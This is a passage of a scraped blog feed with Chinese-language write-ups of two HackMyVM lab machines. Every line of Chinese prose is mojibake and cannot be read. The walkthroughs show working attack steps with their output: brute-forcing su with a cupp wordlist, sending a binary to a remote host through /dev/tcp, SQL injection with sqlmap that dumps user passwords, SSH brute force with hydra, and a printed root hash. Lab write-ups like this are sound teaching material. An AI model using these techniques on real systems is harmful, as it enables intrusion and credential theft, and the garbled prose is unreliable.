this is a <span class="title class_">PWN</span> type machine.</span><br><span class="line"></span><br><span class="line">æœ‰ä¸€ä¸ªå¾ˆå¥½ç©çš„å·¥å…·å«åš cupp.</span><br><span class="line">å¬è¯´é‚£æ˜¯ä¸€ä¸ªä¸é”™çš„ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸ç”Ÿæˆå™¨.</span><br><span class="line">ç°åœ¨çœŸçš„è¿˜ä¼šæœ‰äººè¿™ä¹ˆè ¢å—ï¼Ÿhaha.</span><br><span class="line">æˆä¸º <span class="title class_">ROOT</span> çš„æ–¹æ³•åªæœ‰ä¸€æ¡ï¼Œå°±æ˜¯æ‰§è¡Œ getroot !!!</span><br><span class="line">è€Œä¸”ä½ ä¸è¦å¿˜è®°äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªpwnç±»å‹çš„æœºå™¨.</span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸€ä¸ªæç¤ºï¼Œå°±æ˜¯ç”¨cuppç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œå› ä¸ºsudoæ‰§è¡Œéœ€è¦å¯†ç </p>
<p>cuppåªç”¨lambè¿™ä¸ªåå­—æ²¡æœ‰å‡ºæ¥ï¼Œæ‰€ä»¥æ‰¾æ‰¾åˆ«çš„ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">lamb@pwnding:~$ find /  -name &#x27;.*&#x27; -print <span class="number">2</span>&gt;/dev/null | grep -Pv &#x27;<span class="keyword">proc</span>|run|sys&#x27;</span><br><span class="line">/var/backups/.secret</span><br><span class="line">/var/backups/.secret/.verysecret</span><br><span class="line">/var/backups/.secret/.verysecret/.noooooo</span><br><span class="line">/home/lamb/.viminfo</span><br><span class="line">/home/lamb/.profile</span><br><span class="line">/home/lamb/.bashrc</span><br><span class="line">/home/lamb/.bash_logout</span><br><span class="line">/home/lamb/.bash_history</span><br><span class="line">/tmp/.font-unix</span><br><span class="line">/tmp/.Test-unix</span><br><span class="line">/tmp/.X11-unix</span><br><span class="line">/tmp/.ICE-unix</span><br><span class="line">/tmp/.XIM-unix</span><br><span class="line">/etc/cron.daily/.placeholder</span><br><span class="line">/etc/cron.hourly/.placeholder</span><br><span class="line">/etc/cron.d/.placeholder</span><br><span class="line">/etc/cron.weekly/.placeholder</span><br><span class="line">/etc/cron.monthly/.placeholder</span><br><span class="line">/etc/skel/.profile</span><br><span class="line">/etc/skel/.bashrc</span><br><span class="line">/etc/skel/.bash_logout</span><br><span class="line">/etc/.pwd.lock<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">lamb@pwnding:~$</span> cat /var/backups/.secret/.verysecret/.noooooo<span class="title"></span></span><br><span class="line"><span class="title">cat:</span> /var/backups/.secret/.verysecret/.noooooo:<span class="title"> Is</span> a<span class="title"> directory</span></span><br><span class="line">lamb@pwnding:~$<span class="title"> cd</span> /var/backups/.secret/.verysecret/.noooooo<span class="title"></span></span><br><span class="line"><span class="title">lamb@pwnding:/var/backups/.secret/.verysecret/.noooooo$</span> ls<span class="title"></span></span><br><span class="line"><span class="title">note2.txt</span></span><br><span class="line">lamb@pwnding:/var/backups/.secret/.verysecret/.noooooo$<span class="title"> cat</span> note2.txt<span class="title"> </span></span><br><span class="line"><span class="title">The</span> Compass<span class="title"> and</span> the<span class="title"> Campfire</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">David</span> knelt<span class="title"> beside</span> his<span class="title"> ten-year-old</span> son,<span class="title"> Jake,</span> their<span class="title"> shared</span> backpack<span class="title"> spilling</span> onto<span class="title"> the</span> forest<span class="title"> floor.</span> &quot;Lost?&quot;<span class="title"> Jake</span> whispered,<span class="title"> staring</span> at<span class="title"> the</span> identical<span class="title"> trees</span> clawing<span class="title"> at</span> the<span class="title"> twilight.</span> Davidâ€™s<span class="title"> calloused</span> fingers<span class="title"> brushed</span> the<span class="title"> cracked</span> compass<span class="title"> in</span> his<span class="title"> palmâ€”a</span> relic<span class="title"> from</span> his<span class="title"> father,</span> its<span class="title"> needle</span> trembling<span class="title"> like</span> a<span class="title"> moth.</span> &quot;Not<span class="title"> lost,&quot;</span> he<span class="title"> lied.</span> &quot;Justâ€¦<span class="title"> rerouting.&quot;</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">Jakeâ€™s</span> eyes<span class="title"> narrowed,</span> too<span class="title"> sharp</span> for<span class="title"> comfort.</span> &quot;Your<span class="title"> compass</span> is<span class="title"> broken.&quot;</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">A</span> chuckle<span class="title"> escaped</span> David,<span class="title"> brittle</span> as<span class="title"> dry</span> leaves. &quot;Compasses<span class="title"> donâ€™t</span> break,<span class="title"> bud.</span> Theyâ€¦<span class="title"> forget.&quot;</span> He<span class="title"> flipped</span> it<span class="title"> open,</span> the<span class="title"> glass</span> fogged<span class="title"> with</span> age. &quot;See?<span class="title"> North</span> isnâ€™t<span class="title"> where</span> it<span class="title"> should</span> be.<span class="title"> Itâ€™s</span> where<span class="title"> it</span> chooses<span class="title"> to</span> be<span class="title"> tonight.&quot;</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">The</span> boy<span class="title"> frowned,</span> then<span class="title"> yelped</span> as<span class="title"> a</span> pinecone<span class="title"> thudded</span> beside<span class="title"> him.</span> A<span class="title"> red</span> squirrel<span class="title"> chattered</span> overhead,<span class="title"> its</span> tail<span class="title"> flicking</span> like<span class="title"> a</span> metronome.<span class="title"> Jakeâ€™s</span> fear<span class="title"> dissolved</span> into<span class="title"> giggles.</span> David<span class="title"> watched,</span> throat<span class="title"> tight.</span> Heâ€™s<span class="title"> still</span> young<span class="title"> enough</span> to<span class="title"> laugh</span> at<span class="title"> squirrels.</span></span><br><span class="line"></span><br><span class="line">&quot;Dad?&quot;<span class="title"> Jake</span> unzipped<span class="title"> his</span> jacket,<span class="title"> revealing</span> three<span class="title"> granola</span> bars<span class="title"> and</span> a<span class="title"> glowstick.</span> &quot;Weâ€™ve<span class="title"> got</span> supplies.<span class="title"> Letâ€™s</span> build<span class="title"> a</span> fort.&quot;<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">They</span> wove<span class="title"> branches</span> into<span class="title"> a</span> crooked<span class="title"> shelter,</span> Jakeâ€™s<span class="title"> hands</span> steady<span class="title"> where</span> Davidâ€™s<span class="title"> shook.</span> When<span class="title"> the</span> first<span class="title"> stars</span> pierced<span class="title"> the</span> canopy,<span class="title"> David</span> confessed: &quot;Grandpa<span class="title"> gave</span> me<span class="title"> this</span> compass<span class="title"> the</span> day<span class="title"> I</span> got<span class="title"> lost</span> in<span class="title"> the</span> mall.<span class="title"> Told</span> me<span class="title"> itâ€™d</span> always<span class="title"> point</span> home.&quot;<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">Jake</span> snapped<span class="title"> the</span> glowstick,<span class="title"> bathing</span> their<span class="title"> fort</span> in<span class="title"> alien</span> green. &quot;Does<span class="title"> it</span> work<span class="title"> now?&quot;</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">The</span> needle<span class="title"> quivered,</span> settling<span class="title"> northwest.</span> Toward<span class="title"> the</span> distant<span class="title"> highway</span> hum,<span class="title"> not</span> their<span class="title"> cabinâ€™s</span> woodsmoke.<span class="title"> David</span> closed<span class="title"> the</span> brass<span class="title"> lid.</span> &quot;Nope.<span class="title"> But</span> you<span class="title"> do.&quot;</span> He<span class="title"> nodded</span> at<span class="title"> Jakeâ€™s</span> pocketâ€”where<span class="title"> a</span> crumpled<span class="title"> trail</span> map<span class="title"> peeked</span> out,<span class="title"> dotted</span> with<span class="title"> the</span> boyâ€™s<span class="title"> doodled</span> dinosaurs.<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">Dawn</span> found<span class="title"> them</span> at<span class="title"> the</span> cabinâ€™s<span class="title"> porch,</span> guided<span class="title"> by</span> Jakeâ€™s<span class="title"> roars</span> laughter<span class="title"> and</span> the<span class="title"> squirrels</span> heâ€™d<span class="title"> named</span> &quot;Sir<span class="title"> Nibbles&quot;.</span> The<span class="title"> compass</span> stayed<span class="title"> in</span> Davidâ€™s<span class="title"> pocket,</span> its<span class="title"> secret</span> safe:<span class="title"> true</span> north<span class="title"> had</span> shifted<span class="title"> years</span> ago,<span class="title"> anywayâ€”from</span> steel<span class="title"> poles</span> to<span class="title"> a</span> gap-toothed<span class="title"> grin</span> eating<span class="title"> pancakes</span> at 6<span class="title"> AM.</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°äº†ç¬¬äºŒä¸ªæç¤ºï¼Œè¿™é‡Œæœ‰äººå ç”¨cupp å†™ä¸Šdavidå’Œsurname kneltä»¥åŠå„¿å­çš„åå­—jakeç”Ÿæˆä¸€ä¸ªå­—å…¸<br>ç„¶åç”¨suforceè·‘ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">lamb<span class="meta">@pwnding:~$</span> wget 192.168.80.11/david.txt</span><br><span class="line">--2025-03-23 12:21:40--  http://192.168.80.11/david.txt</span><br><span class="line">Connecting to 192.168.80.11:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3019 (2.9K) [text/plain]</span><br><span class="line">Saving to: â€˜david.txtâ€™</span><br><span class="line"></span><br><span class="line">david.txt                    100%[=============================================&gt;]   2.95K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2025-03-23 12:21:40 (9.69 MB/s) - â€˜david.txtâ€™ saved [3019/3019]</span><br><span class="line"></span><br><span class="line">lamb<span class="meta">@pwnding:~$</span> su</span><br><span class="line">su          sudo        sudoedit    sudoreplay  sum         suspend     </span><br><span class="line">lamb<span class="meta">@pwnding:~$</span> ./suForce -u lamb -w david.txt </span><br><span class="line">            _____                          </span><br><span class="line"> ___ _   _ |<span class="string">  ___</span>|<span class="string">__  _ __ ___ ___   </span></span><br><span class="line"><span class="string">/ __</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>||<span class="string"> </span>|<span class="string">_ / _ \</span>|<span class="string"> &#x27;__/ __/ _ \ </span></span><br><span class="line"><span class="string">\__ \ </span>|<span class="string">_</span>|<span class="string"> </span>||<span class="string">  _</span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string">  __/  </span></span><br><span class="line"><span class="string"></span>|<span class="string">___/\__,_</span>||<span class="string">_</span>|<span class="string">  \___/</span>|<span class="string">_</span>|<span class="string">  \___\___</span>|<span class="string">  </span></span><br><span class="line"><span class="string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span></span><br><span class="line"><span class="string"> code: d4t4s3c     version: v1.0.0</span></span><br><span class="line"><span class="string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span></span><br><span class="line"><span class="string">Ã°ÂŸÂÂ¯ Username </span>|<span class="string"> lamb</span></span><br><span class="line"><span class="string">Ã°ÂŸÂ“Â– Wordlist </span>|<span class="string"> david.txt</span></span><br><span class="line"><span class="string">Ã°ÂŸÂ”Â Status   </span>|<span class="string"> 203/297/68%/ekaJ_2016</span></span><br><span class="line"><span class="string">Ã°ÂŸÂ’Â¥ Password </span>|<span class="string"> ekaJ_2016</span></span><br><span class="line"><span class="string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span></span><br></pre></td></tr></table></figure></div>

<p>æˆåŠŸæ‹¿åˆ°å¯†ç ï¼Œ ä¸‹ä¸€æ­¥å°±æ˜¯åˆ†æè¿™ä¸ªsudoç¨‹åº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lamb<span class="variable">@pwnding</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">lamb:</span> </span><br><span class="line"><span class="title class_">Sorry</span>, <span class="keyword">try</span> again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">lamb:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> lamb on <span class="symbol">pwnding:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> lamb may run the following commands on <span class="symbol">pwnding:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">PASSWD:</span> /usr/local/bin/getroot</span><br></pre></td></tr></table></figure></div>
<h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><p>æŠŠæ–‡ä»¶æ‹¿åˆ°æœ¬åœ°æ¥åˆ†æä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">lamb@pwnding:~$ cat <span class="regexp">/usr/</span>local<span class="regexp">/bin/g</span>etroot &gt; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.80.11/</span><span class="number">1234</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234 &gt; getroot </span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åç»§ç»­æ‹‰åˆ°idaé‡Œé¢çœ‹ ï¼Œ è¿™ä¸ªç¨‹åºä¼šæ¥å—ä¸€ä¸ªå‚æ•°magic_numberï¼Œ å¦‚æœè¿™ä¸ªå‚æ•°æ­£ç¡®å°±ä¼šçœ‹åˆ°&#x2F;root&#x2F;credçš„å†…å®¹<br>ç°åœ¨åªè¦æŠŠä¸»å‡½æ•°å’Œè¿™ä¸ªgenerate_normal_distributionå‡½æ•°ç»™aiï¼Œè®©aiç”Ÿæˆä¸€ä¸ªç”Ÿæˆmagicçš„ä»£ç ï¼Œç„¶åé€šè¿‡è¿™ä¸ªä»£ç çš„æ‰§è¡Œç»“æœç»™getrootæ‹¿åˆ°ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lamb<span class="variable">@pwnding</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/local/bin/getroot <span class="variable">$(</span>./a.out)</span><br><span class="line"><span class="variable">$1</span><span class="variable">$BvrTqWyB</span><span class="variable">$Soa7qkeu1GfIoy2duf53t0</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªå°±æ˜¯rootçš„å¯†ç äº†</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li>ç¬¬ä¸€åšçš„æ—¶å€™å°±æ˜¯æ‹¿åˆ°ç”¨æˆ·å¯†ç é‚£é‡Œå¡ä½äº†ï¼ŒåŸæ¥æœ‰ä¸ªsurnnameæ²¡å†™ï¼Œå­¦åˆ°äº†</li>
<li>é€šè¿‡è¿™ä¸ªé¶æœºå­¦ä¹ ä¸€ä¸‹tcp_reverse_shellè¿™ä¸ªç”Ÿæˆshellcodeçš„payload</li>
<li>pwnå…¥é—¨ä¹‹åå¯¹idaå·¥å…·ä¹Ÿç†Ÿç»ƒäº†ä¸€ç‚¹ï¼Œä½†æ˜¯è¿™é¢˜ä¹Ÿæ²¡æœ‰ç”¨åˆ°pwn</li>
<li>å­¦ä¹ æ‰¾åˆ°éšè—æ–‡ä»¶<code>find / -name &#39;.*&#39; -print 2&gt;/dev/null | grep -Pv &#39;sys|run|proc&#39;</code></li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Talk</title>
    <url>/posts/41749.html</url>
    <content><![CDATA[<p>HMV-Talké¶æœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.112.47</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">19</span> <span class="number">11</span>:<span class="number">09</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.47</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> e3:fc:<span class="number">1</span>b:<span class="number">74</span>:e5:e3:c9:ef:<span class="number">6</span>d:ac:df:b1:<span class="number">1</span>e:<span class="number">47</span>:<span class="number">83</span>:ad (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">10</span>:bd:<span class="number">60</span>:<span class="number">33</span>:a0:d1:a4:<span class="number">7</span>d:de:c8:<span class="number">29</span>:<span class="number">0</span>a:c4:<span class="number">7</span>d:b1:aa (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>b:fc:<span class="number">30</span>:a8:<span class="number">12</span>:<span class="number">69</span>:e7:b2:ce:ad:<span class="number">99</span>:f1:<span class="number">66</span>:<span class="number">12</span>:cd:<span class="number">8</span>c (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">| <span class="params">http-cookie-flags:</span> </span><br><span class="line">|   <span class="operator">/</span>: </span><br><span class="line">|     <span class="params">PHPSESSID:</span> </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|<span class="params">_http-title:</span> chatME</span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">7</span>E:<span class="number">2</span>E:BE:B7:<span class="number">58</span>:B6 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.40</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.47</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.72</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p><img src="https://pic1.imgdb.cn/item/67b54bb5d0e0a243d400a705.png"><br>æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½†æ˜¯å¯ä»¥æ³¨å†Œè´¦å·<br>æ³¨å†Œä¹‹åå¯ä»¥ç™»å½•ï¼Œæ˜¯ä¸€ä¸ªèŠå¤©æ¡†<br><img src="https://pic1.imgdb.cn/item/67b54bf3d0e0a243d400a713.png"><br>æ‰«äº†ä¸‹ç›®å½•ä¹Ÿæ²¡æœ‰å…¶ä»–çš„ï¼Œè¿™ä¸ªç™»å½•ä½ç½®ä¹Ÿä¸èƒ½çˆ†ç ´ï¼Œé‚£å°±sqlæ³¨å…¥è¯•è¯•äº†<br>bpæŠ“åŒ…loginç•Œé¢ï¼ŒæŠŠåŒ…å†…å®¹æ”¾åœ¨ä¸€ä¸ªtxtæ–‡ä»¶é‡Œï¼Œç„¶åç”¨sqlå¯¹è¿™ä¸ªæ–‡ä»¶æ‰«æï¼ŒæŒ‡å®šå­—æ®µæ˜¯username<br>sqlmapå¯ä»¥æˆåŠŸsqlæ³¨å…¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çˆ†åº“ çˆ†è¡¨ å­—æ®µï¼Œå¾—åˆ°è´¦æˆ·å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># cat tmp.txt        </span></span><br><span class="line">POST //login.php HTTP/1.1</span><br><span class="line">Host: 192.168.112.47</span><br><span class="line">Content-Length: 25</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.112.47</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<span class="symbol">*</span>/<span class="symbol">*</span>;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.112.47//index.php?attempt=failed</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=mb3h6lao2hsvuiiduk34js813o</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=111&amp;password=111</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch   </span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch --dbs</span></span><br><span class="line">available databases [4]:</span><br><span class="line">[<span class="symbol">*</span>] chat</span><br><span class="line">[<span class="symbol">*</span>] information_schema</span><br><span class="line">[<span class="symbol">*</span>] mysql</span><br><span class="line">[<span class="symbol">*</span>] performance_schema</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch -D chat --tables</span></span><br><span class="line">[3 tables]</span><br><span class="line">+-----------+</span><br><span class="line">|<span class="string"> user      </span>|</span><br><span class="line">|<span class="string"> chat      </span>|</span><br><span class="line">|<span class="string"> chat_room </span>|</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch -D chat -T user --columns --dump</span></span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">|<span class="string"> Column    </span>|<span class="string"> Type         </span>|</span><br><span class="line">+-----------+--------------+</span><br><span class="line">|<span class="string"> email     </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> password  </span>|<span class="string"> varchar(30)  </span>|</span><br><span class="line">|<span class="string"> phone     </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> userid    </span>|<span class="string"> int(11)      </span>|</span><br><span class="line">|<span class="string"> username  </span>|<span class="string"> varchar(30)  </span>|</span><br><span class="line">|<span class="string"> your_name </span>|<span class="string"> varchar(60)  </span>|</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch -D chat -T user -C username,password --dump</span></span><br><span class="line">        ___</span><br><span class="line"></span><br><span class="line">+----------+-----------------+</span><br><span class="line">|<span class="string"> username </span>|<span class="string"> password        </span>|</span><br><span class="line">+----------+-----------------+</span><br><span class="line">|<span class="string"> david    </span>|<span class="string"> adrianthebest   </span>|</span><br><span class="line">|<span class="string"> tina     </span>|<span class="string"> davidwhatpass   </span>|</span><br><span class="line">|<span class="string"> kakeru   </span>|<span class="string"> kakeru          </span>|</span><br><span class="line">|<span class="string"> nona     </span>|<span class="string"> myfriendtom     </span>|</span><br><span class="line">|<span class="string"> pao      </span>|<span class="string"> pao             </span>|</span><br><span class="line">|<span class="string"> jerry    </span>|<span class="string"> thatsmynonapass </span>|</span><br><span class="line">+----------+-----------------+</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨hydraçˆ†ç ´ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -L <span class="keyword">user</span>.txt -P pass.txt ssh://<span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>                                                            </span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-19</span> <span class="number">12</span>:<span class="number">06</span>:<span class="number">10</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">25</span> <span class="keyword">login</span> tries (l:<span class="number">5</span>/p:<span class="number">5</span>), ~<span class="number">2</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>   <span class="keyword">login</span>: nona   <span class="keyword">password</span>: thatsmynonapass</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>   <span class="keyword">login</span>: david   <span class="keyword">password</span>: davidwhatpass</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>   <span class="keyword">login</span>: jerry   <span class="keyword">password</span>: myfriendtom</span><br><span class="line"><span class="number">1</span> <span 